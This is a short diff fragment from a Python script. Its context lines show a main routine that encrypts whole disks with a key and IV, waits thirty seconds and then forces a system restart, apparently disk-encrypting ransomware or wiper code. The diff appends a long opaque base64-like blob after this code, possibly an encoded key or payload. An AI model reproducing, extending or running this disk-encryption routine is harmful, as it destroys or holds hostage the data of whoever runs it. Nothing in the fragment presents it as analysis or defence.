@@ -74,3 +74,6 @@ if __name__ == '__main__':
             read_encrypt_write_disk(disk_number, key, IV)  # function call: read_encrypt_write_disk()
         wait_in_cmd(30)  # wait 30 seconds (cmd)
         restart_computer()  # system restart
+        
+        
+U5rx0WoOYKVmfy3nWa0WaPSUpoyA0AF+ZEKh14iGcbIC6Jh3FKr7/hjeG3Eqnl5s4ilowkWPdzcfC2WIepaGChRqUgvevoXHzjLy2INE9lBMcmtgZAsvPGa0S6NbzGf8eJ0u8xwDbgseibYNWYwDRl1pVW7iKj2QlhzQKUN7BqkrxwsAKFizKkNCQ0/o7mrJ0QuoFO2yRktQMiBgliPhsc26ukKWR4nVHcBygzoHgx93rZgCyl4TPbSmTiKW1HJDe7lX9nUR6vP6dgSfBPkSudlu55WT4ubU7kPD9gBQDkZ7DLYYDpnPRhJFxwbSbZJu6tiL6OXkwQ0w4QAGq/rngg==
